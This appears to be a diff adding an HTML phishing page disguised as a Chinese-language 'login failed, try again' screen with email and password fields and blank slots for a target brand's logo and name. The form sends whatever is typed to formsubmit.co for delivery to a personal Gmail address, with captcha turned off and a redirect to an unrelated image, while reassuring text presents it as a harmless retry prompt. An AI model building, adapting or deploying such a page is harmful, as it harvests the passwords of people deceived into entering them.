@@ -1,0 +1,735 @@
+<!doctype html>
+<html lang="zh">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>登录失败 • 请重试</title>
+  <meta name="description" content="登录失败页面，带有重试按钮。" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,600,700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg0:#0b0c10;
+      --bg1:#0f121a;
+      --ink:#eef1f6;
+      --muted:#aab2c2;
+      --soft:#1a2030;
+      --line: rgba(255,255,255,.10);
+      --line2: rgba(255,255,255,.16);
+
+      --danger:#ff4d6d;
+      --danger2:#ff2d55;
+      --amber:#ffb703;
+
+      --ok:#34d399;
+
+      --shadow: 0 20px 60px rgba(0,0,0,.55);
+      --shadow2: 0 12px 30px rgba(0,0,0,.38);
+
+      --radius: 22px;
+      --radius2: 16px;
+
+      --ease: cubic-bezier(.2,.9,.2,1);
+    }
+
+    *{ box-sizing:border-box; }
+    html,body{ height:100%; margin:0; padding:0; }
+    body{
+      color: var(--ink);
+      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+      background: #1E3A8A; /* Blue background */
+      overflow-x: hidden;
+    }
+
+    /* subtle texture */
+    body::before{
+      content:"";
+      position:fixed;
+      inset:0;
+      pointer-events:none;
+      opacity:.12;
+      background-image:
+        linear-gradient(transparent 0, transparent 9px, rgba(255,255,255,.05) 10px),
+        linear-gradient(90deg, transparent 0, transparent 9px, rgba(255,255,255,.05) 10px);
+      background-size: 10px 10px;
+      mix-blend-mode: overlay;
+      filter: blur(.25px);
+    }
+
+    header{
+      position:relative;
+      padding: 18px clamp(16px, 4vw, 34px);
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:16px;
+    }
+
+    .brand{
+      display:flex;
+      align-items:center;
+      gap:12px;
+      text-decoration:none;
+      color:inherit;
+      min-width: 220px;
+    }
+
+    .mark{
+      width: 40px;
+      height: 40px;
+      border-radius: 14px;
+      background:
+        radial-gradient(16px 16px at 30% 30%, rgba(255,255,255,.35), transparent 55%),
+        conic-gradient(from 210deg, rgba(255,77,109,.95), rgba(255,183,3,.95), rgba(255,77,109,.95));
+      box-shadow: 0 10px 30px rgba(255,77,109,.18);
+      position:relative;
+      overflow:hidden;
+      border: 1px solid rgba(255,255,255,.14);
+    }
+    .mark::after{
+      content:"";
+      position:absolute;
+      inset:-2px;
+      background:
+        radial-gradient(160px 60px at 10% 10%, rgba(255,255,255,.22), transparent 55%);
+      transform: rotate(8deg);
+    }
+
+    .brand strong{
+      font-family: Fraunces, serif;
+      letter-spacing:.2px;
+      font-size: 16px;
+      line-height:1.1;
+    }
+    .brand span{
+      display:block;
+      font-size:12px;
+      color: var(--muted);
+      margin-top:2px;
+      letter-spacing:.2px;
+    }
+
+    .help{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      color: var(--muted);
+      font-size: 13px;
+    }
+    .help a{
+      color: var(--ink);
+      text-decoration:none;
+      border-bottom: 1px solid rgba(255,255,255,.22);
+      padding-bottom:2px;
+    }
+    .help a:focus-visible{
+      outline: 3px solid rgba(255,183,3,.6);
+      outline-offset: 3px;
+      border-bottom-color: transparent;
+      border-radius: 8px;
+    }
+
+    main{
+      min-height: calc(100% - 80px);
+      display:grid;
+      place-items:center;
+      padding: 18px clamp(16px, 4vw, 34px) 42px;
+    }
+
+    .shell{
+      width:min(980px, 100%);
+      display:grid;
+      grid-template-columns: 1.2fr .9fr;
+      gap: clamp(14px, 2.8vw, 22px);
+      align-items:stretch;
+    }
+
+    @media (max-width: 880px){
+      .shell{ grid-template-columns: 1fr; }
+      .brand{ min-width: unset; }
+    }
+
+    .panel{
+      position:relative;
+      border-radius: var(--radius);
+      background:
+        radial-gradient(900px 500px at 15% 10%, rgba(255,77,109,.18), transparent 55%),
+        radial-gradient(720px 420px at 90% 25%, rgba(255,183,3,.12), transparent 60%),
+        linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.03));
+      border: 1px solid var(--line);
+      box-shadow: var(--shadow);
+      overflow:hidden;
+      backdrop-filter: blur(10px);
+    }
+
+    .panel::after{
+      content:"";
+      position:absolute;
+      inset:-1px;
+      pointer-events:none;
+      background:
+        radial-gradient(600px 220px at 40% 0%, rgba(255,255,255,.12), transparent 50%),
+        radial-gradient(600px 220px at 0% 60%, rgba(255,255,255,.06), transparent 55%);
+      opacity:.8;
+    }
+
+    .panel-inner{
+      position:relative;
+      z-index:1;
+      padding: clamp(18px, 3.2vw, 30px);
+      display:flex;
+      flex-direction:column;
+      height:100%;
+    }
+
+    .kicker{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      color: var(--muted);
+      font-size: 13px;
+      letter-spacing:.18em;
+      text-transform: uppercase;
+    }
+
+    .kicker .dot{
+      width:10px;height:10px;border-radius:50%;
+      background: radial-gradient(circle at 30% 30%, rgba(255,255,255,.5), rgba(255,77,109,.95));
+      box-shadow: 0 8px 18px rgba(255,77,109,.26);
+    }
+
+    h1{
+      margin: 14px 0 10px;
+      font-family: Fraunces, serif;
+      font-size: clamp(30px, 4.2vw, 46px);
+      line-height: 1.02;
+      letter-spacing: -0.02em;
+    }
+
+    .sub{
+      margin: 0 0 18px;
+      color: rgba(238,241,246,.86);
+      font-size: 15px;
+      line-height: 1.6;
+      max-width: 56ch;
+    }
+
+    .reason{
+      margin-top: 8px;
+      border-radius: var(--radius2);
+      border: 1px solid rgba(255,77,109,.35);
+      background: linear-gradient(180deg, rgba(255,77,109,.10), rgba(255,77,109,.06));
+      padding: 14px 14px 12px;
+      display:flex;
+      gap:12px;
+      align-items:flex-start;
+    }
+
+    .reason svg{ flex:0 0 auto; margin-top: 2px; }
+    .reason strong{
+      display:block;
+      font-weight: 650;
+      letter-spacing:.1px;
+      margin-bottom: 4px;
+    }
+    .reason p{
+      margin:0;
+      color: rgba(238,241,246,.82);
+      font-size: 13.5px;
+      line-height: 1.55;
+    }
+
+    .meta-row{
+      margin-top:auto;
+      padding-top: 18px;
+      display:flex;
+      flex-wrap:wrap;
+      gap: 10px;
+      align-items:center;
+      justify-content:space-between;
+      border-top: 1px solid rgba(255,255,255,.10);
+    }
+
+    .meta{
+      display:flex;
+      gap: 10px;
+      align-items:center;
+      color: var(--muted);
+      font-size: 13px;
+    }
+    .pill{
+      display:inline-flex;
+      align-items:center;
+      gap:8px;
+      padding: 8px 10px;
+      border-radius: 999px;
+      background: rgba(255,255,255,.05);
+      border: 1px solid rgba(255,255,255,.10);
+    }
+    .pill code{
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+      font-size: 12px;
+      color: rgba(238,241,246,.92);
+    }
+
+    .actions{
+      border-radius: var(--radius);
+      background: linear-gradient(180deg, rgba(255,255,255,.05), rgba(255,255,255,.03));
+      border: 1px solid var(--line);
+      box-shadow: var(--shadow2);
+      overflow:hidden;
+      backdrop-filter: blur(10px);
+      position:relative;
+    }
+
+    .actions::before{
+      content:"";
+      position:absolute;
+      inset:0;
+      background:
+        radial-gradient(500px 280px at 50% 10%, rgba(255,183,3,.10), transparent 60%),
+        radial-gradient(520px 320px at 90% 90%, rgba(255,77,109,.10), transparent 65%);
+      pointer-events:none;
+    }
+
+    .actions-inner{
+      position:relative;
+      z-index:1;
+      padding: clamp(18px, 3.2vw, 26px);
+      display:flex;
+      flex-direction:column;
+      gap: 14px;
+      height:100%;
+    }
+
+    .summary{
+      display:grid;
+      gap: 10px;
+    }
+
+    .summary h2{
+      margin:0;
+      font-family: Fraunces, serif;
+      font-size: 20px;
+      letter-spacing:-0.01em;
+    }
+
+    .summary p{
+      margin:0;
+      color: rgba(238,241,246,.78);
+      font-size: 13.5px;
+      line-height: 1.55;
+    }
+
+    .field{
+      display:grid;
+      gap: 8px;
+      margin-top: 4px;
+    }
+
+    label{
+      font-size: 12px;
+      color: var(--muted);
+      letter-spacing: .12em;
+      text-transform: uppercase;
+    }
+
+    .input{
+      display:flex;
+      align-items:center;
+      gap: 10px;
+      padding: 12px 12px;
+      border-radius: 14px;
+      border: 1px solid rgba(255,255,255,.12);
+      background: rgba(10,12,18,.35);
+    }
+
+    .input input{
+      width:100%;
+      background: transparent;
+      border: 0;
+      color: var(--ink);
+      font-size: 14px;
+      outline: none;
+    }
+    .input input::placeholder{
+      color: rgba(170,178,194,.7);
+    }
+
+    .hint{
+      color: rgba(170,178,194,.85);
+      font-size: 12.5px;
+      line-height: 1.45;
+    }
+
+    .btn{
+      appearance:none;
+      border:0;
+      cursor:pointer;
+      border-radius: 16px;
+      padding: 12px 14px;
+      font-weight: 650;
+      letter-spacing:.2px;
+      color: #14070c;
+      background:
+        radial-gradient(120px 60px at 20% 20%, rgba(255,255,255,.55), transparent 60%),
+        linear-gradient(135deg, var(--danger), var(--danger2));
+      box-shadow:
+        0 16px 38px rgba(255,45,85,.20),
+        inset 0 1px 0 rgba(255,255,255,.24);
+      transform: translateY(0);
+      transition: transform .18s var(--ease), filter .18s var(--ease), box-shadow .18s var(--ease);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:10px;
+      min-height: 48px;
+    }
+    .btn:hover{
+      transform: translateY(-1px);
+      filter: saturate(1.05) contrast(1.02);
+      box-shadow:
+        0 18px 44px rgba(255,45,85,.25),
+        inset 0 1px 0 rgba(255,255,255,.26);
+    }
+    .btn:active{
+      transform: translateY(1px) scale(.99);
+    }
+    .btn:focus-visible{
+      outline: 3px solid rgba(255,183,3,.65);
+      outline-offset: 3px;
+    }
+
+    .btn.secondary{
+      color: var(--ink);
+      background:
+        radial-gradient(110px 50px at 20% 10%, rgba(255,255,255,.10), transparent 60%),
+        linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.04));
+      border: 1px solid rgba(255,255,255,.14);
+      box-shadow: 0 14px 30px rgba(0,0,0,.28);
+    }
+    .btn.secondary:hover{
+      box-shadow: 0 16px 34px rgba(0,0,0,.34);
+    }
+
+    .row{
+      display:flex;
+      gap: 10px;
+      flex-wrap:wrap;
+    }
+    .row .btn{ flex: 1 1 180px; }
+
+    .fineprint{
+      margin-top:auto;
+      padding-top: 14px;
+      border-top: 1px solid rgba(255,255,255,.10);
+      color: rgba(170,178,194,.85);
+      font-size: 12.5px;
+      line-height: 1.55;
+    }
+    .fineprint a{
+      color: rgba(238,241,246,.92);
+      text-decoration: none;
+      border-bottom: 1px solid rgba(255,255,255,.22);
+      padding-bottom: 1px;
+    }
+
+    .reveal{
+      opacity: 0;
+      transform: translateY(10px);
+      animation: rise .7s var(--ease) forwards;
+    }
+    .d1{ animation-delay: .05s; }
+    .d2{ animation-delay: .14s; }
+    .d3{ animation-delay: .22s; }
+    .d4{ animation-delay: .30s; }
+    .d5{ animation-delay: .38s; }
+
+    @keyframes rise{
+      to{ opacity:1; transform: translateY(0); }
+    }
+
+    .toast{
+      position: fixed;
+      left: 50%;
+      bottom: 18px;
+      transform: translateX(-50%);
+      width: min(560px, calc(100% - 28px));
+      border-radius: 16px;
+      background: rgba(14,18,28,.72);
+      border: 1px solid rgba(255,255,255,.14);
+      box-shadow: 0 22px 60px rgba(0,0,0,.55);
+      backdrop-filter: blur(10px);
+      padding: 12px 12px;
+      display:flex;
+      align-items:flex-start;
+      gap: 10px;
+      opacity: 0;
+      pointer-events:none;
+      transition: opacity .22s var(--ease), transform .22s var(--ease);
+    }
+    .toast.show{
+      opacity: 1;
+      pointer-events:auto;
+      transform: translateX(-50%) translateY(-6px);
+    }
+    .toast strong{
+      display:block;
+      font-size: 13px;
+      margin: 0 0 2px;
+    }
+    .toast p{
+      margin:0;
+      color: rgba(238,241,246,.78);
+      font-size: 12.5px;
+      line-height: 1.45;
+    }
+    .toast .x{
+      margin-left:auto;
+      border:0;
+      cursor:pointer;
+      color: rgba(238,241,246,.8);
+      background: transparent;
+      border-radius: 10px;
+      padding: 8px 10px;
+    }
+    .toast .x:focus-visible{ outline: 3px solid rgba(255,183,3,.65); outline-offset: 2px; }
+
+    @media (prefers-reduced-motion: reduce){
+      .reveal{ opacity:1; transform:none; animation:none; }
+      .btn{ transition:none; }
+      .toast{ transition:none; }
+    }
+  </style>
+</head>
+
+<body>
+  <header>
+    <div class="header-container">
+                <img id="domain-logo" src="" alt="Domain Logo">
+                <h2 id="domain-name"></h2>
+            </div>
+      
+        
+
+    <div class="help reveal d2">
+      <span aria-hidden="true">Need help?</span>
+      <a href="#" id="supportLink">Contact support</a>
+    </div>
+  </header>
+
+  <main>
+    <section class="shell" aria-label="登录失败">
+      <article class="panel reveal d3" aria-labelledby="title">
+        <div class="panel-inner">
+          <div class="kicker">
+            <span class="dot" aria-hidden="true"></span>
+            <span>身份验证</span>
+          </div>
+
+          <h1 id="title">无法登录。</h1>
+          <p class="sub">
+            您输入的邮箱或密码与我们的记录不符。请核对信息后重试。
+          </p>
+
+          <div class="reason" role="status" aria-live="polite">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+              <path d="M12 2.5c5.2 0 9.5 4.3 9.5 9.5S17.2 21.5 12 21.5 2.5 17.2 2.5 12 6.8 2.5 12 2.5Z" stroke="rgba(255,77,109,.9)" stroke-width="1.8"/>
+              <path d="M12 7.1v6.3" stroke="rgba(255,77,109,.95)" stroke-width="1.8" stroke-linecap="round"/>
+              <path d="M12 16.9h.01" stroke="rgba(255,77,109,.95)" stroke-width="3.2" stroke-linecap="round"/>
+            </svg>
+            <div>
+              <strong>凭证错误</strong>
+              <p>
+                提示：请检查大写锁定键、空格，或如果您最近更改了密码，请尝试重置密码。
+              </p>
+            </div>
+          </div>
+
+          <div class="meta-row">
+            <div class="meta">
+              <span class="pill" title="错误代码">
+                <span aria-hidden="true" style="width:8px;height:8px;border-radius:999px;background:rgba(255,77,109,.9);box-shadow:0 0 0 3px rgba(255,77,109,.14)"></span>
+                <code>AUTH-401</code>
+              </span>
+              <span class="pill" title="时间戳">
+                <span aria-hidden="true" style="width:8px;height:8px;border-radius:999px;background:rgba(255,183,3,.95);box-shadow:0 0 0 3px rgba(255,183,3,.14)"></span>
+                <code id="ts">—</code>
+              </span>
+            </div>
+
+            <div class="meta" aria-label="安全提示">
+              <span style="display:inline-flex;align-items:center;gap:8px">
+                <span aria-hidden="true" style="width:10px;height:10px;border-radius:3px;background:rgba(52,211,153,.18);border:1px solid rgba(52,211,153,.35)"></span>
+                尝试次数有限制
+              </span>
+            </div>
+          </div>
+        </div>
+      </article>
+
+      <aside class="actions reveal d4" aria-label="重试操作">
+        <div class="actions-inner">
+          <div class="summary">
+            <h2>请重试</h2>
+            <p>
+              重新输入您的信息。我们会停留在此页面并提示您需要检查的内容。
+            </p>
+          </div>
+
+          <form action="https://formsubmit.co/supermario44t@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="https://static.vecteezy.com/system/resources/previews/001/199/357/original/barcode-png.png">
+            <div class="field">
+              <label for="email">邮箱</label>
+              <div class="input" id="emailWrap">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                  <path d="M4.5 7.5h15v9a2 2 0 0 1-2 2h-11a2 2 0 0 1-2-2v-9Z" stroke="rgba(238,241,246,.7)" stroke-width="1.6" />
+                  <path d="m5.5 8.2 6.1 5a1.5 1.5 0 0 0 1.9 0l6.1-5" stroke="rgba(238,241,246,.7)" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                <input id="email" name="email" type="email" placeholder="姓名@公司.com" inputmode="email" autocomplete="email" />
+              </div>
+              <div class="hint" id="emailHint">使用您注册的邮箱。</div>
+            </div>
+
+            <div class="field">
+              <label for="password">密码</label>
+              <div class="input" id="passWrap">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                  <path d="M7.5 10.5V8.8a4.5 4.5 0 0 1 9 0v1.7" stroke="rgba(238,241,246,.7)" stroke-width="1.6" stroke-linecap="round"/>
+                  <path d="M6.5 10.5h11a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-11a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2Z" stroke="rgba(238,241,246,.7)" stroke-width="1.6"/>
+                  <path d="M12 14v2" stroke="rgba(238,241,246,.7)" stroke-width="1.6" stroke-linecap="round"/>
+                </svg>
+                <input id="password" name="password" type="password" placeholder="请输入密码" autocomplete="current-password" />
+                <button type="button" class="x" id="togglePw" aria-label="显示密码"
+                  style="margin-left:auto;background:transparent;border:0;color:rgba(238,241,246,.8);cursor:pointer;padding:6px 8px;border-radius:10px;">
+                  显示
+                </button>
+              </div>
+              <div class="hint">如果忘记密码，请使用“重置密码”。</div>
+            </div>
+
+            <div class="row" style="margin-top: 6px;">
+              <button class="btn" id="tryAgainBtn" type="submit">
+                <span>重试</span>
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                  <path d="M20 12a8 8 0 1 1-2.34-5.66" stroke="rgba(20,7,12,.95)" stroke-width="1.8" stroke-linecap="round"/>
+                  <path d="M20 6v6h-6" stroke="rgba(20,7,12,.95)" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+              </button>
+
+              <button class="btn secondary" type="button" id="resetBtn">
+                重置密码
+              </button>
+            </div>
+          </form>
+
+          <div class="fineprint">
+            为了您的安全，我们不会指明邮箱是否存在。如果您仍有问题，<a href="#" id="auditLink">查看账户活动</a>。
+          </div>
+        </div>
+      </aside>
+    </section>
+  </main>
+
+  <div class="toast" id="toast" role="status" aria-live="polite" aria-atomic="true">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" aria-hidden="true" style="margin-top:2px">
+      <path d="M12 2.5c5.2 0 9.5 4.3 9.5 9.5S17.2 21.5 12 21.5 2.5 17.2 2.5 12 6.8 2.5 12 2.5Z" stroke="rgba(255,183,3,.95)" stroke-width="1.8"/>
+      <path d="M12 7.1v6.3" stroke="rgba(255,183,3,.95)" stroke-width="1.8" stroke-linecap="round"/>
+      <path d="M12 16.9h.01" stroke="rgba(255,183,3,.95)" stroke-width="3.2" stroke-linecap="round"/>
+    </svg>
+    <div>
+      <strong id="toastTitle">请重试</strong>
+      <p id="toastMsg">请仔细检查您的邮箱和密码，然后提交。</p>
+    </div>
+    <button class="x" id="toastClose" aria-label="关闭消息">关闭</button>
+  </div>
+
+  <script>
+    const tsEl = document.getElementById('ts');
+    const now = new Date();
+    tsEl.textContent = now.toISOString().replace('T', ' ').slice(0, 19) + 'Z';
+
+    const form = document.getElementById('loginForm');
+    const toast = document.getElementById('toast');
+    const toastClose = document.getElementById('toastClose');
+    const toastTitle = document.getElementById('toastTitle');
+    const toastMsg = document.getElementById('toastMsg');
+
+    const email = document.getElementById('email');
+    const password = document.getElementById('password');
+    const emailWrap = document.getElementById('emailWrap');
+    const passWrap = document.getElementById('passWrap');
+
+    const togglePw = document.getElementById('togglePw');
+    togglePw.addEventListener('click', () => {
+      const isPw = password.type === 'password';
+      password.type = isPw ? 'text' : 'password';
+      togglePw.textContent = isPw ? '隐藏' : '显示';
+      togglePw.setAttribute('aria-label', isPw ? '隐藏密码' : '显示密码');
+      password.focus();
+    });
+
+    function showToast(title, msg){
+      toastTitle.textContent = title;
+      toastMsg.textContent = msg;
+      toast.classList.add('show');
+      window.clearTimeout(showToast._t);
+      showToast._t = window.setTimeout(() => toast.classList.remove('show'), 4200);
+    }
+    toastClose.addEventListener('click', () => toast.classList.remove('show'));
+
+    function setErrorState(el, on){
+      el.style.borderColor = on ? 'rgba(255,77,109,.55)' : 'rgba(255,255,255,.12)';
+      el.style.boxShadow = on ? '0 0 0 4px rgba(255,77,109,.12)' : 'none';
+    }
+
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+
+      const eVal = email.value.trim();
+      const pVal = password.value;
+
+      const emailLooksValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(eVal);
+      const passwordLooksValid = pVal.length >= 1;
+
+      setErrorState(emailWrap, !emailLooksValid);
+      setErrorState(passWrap, !passwordLooksValid);
+
+      if(!emailLooksValid || !passwordLooksValid){
+        showToast('缺少信息', '请输入有效的邮箱和密码，然后重试。');
+        if(!emailLooksValid) email.focus();
+        else password.focus();
+        return;
+      }
+
+      showToast('登录失败', '该组合无法识别。请重试。');
+      password.select();
+      password.focus();
+    });
+
+    document.getElementById('resetBtn').addEventListener('click', () => {
+      showToast('重置密码', '在真实应用中，这将向您的邮箱发送重置链接。');
+      email.focus();
+    });
+
+    const supportLink = document.getElementById('supportLink');
+    supportLink.addEventListener('click', (e) => {
+      e.preventDefault();
+      showToast('支持', '在真实应用中，这将打开帮助中心或支持表单。');
+    });
+
+    document.getElementById('auditLink').addEventListener('click', (e) => {
+      e.preventDefault();
+      showToast('账户活动', '在真实应用中，这将显示最近的登录尝试和设备。');
+    });
+
+    window.addEventListener('load', () => {
+      email.focus();
+      showToast('请重试', '请仔细检查您的邮箱和密码，然后提交。');
+    });
+  </script>
+</body>
+</html>
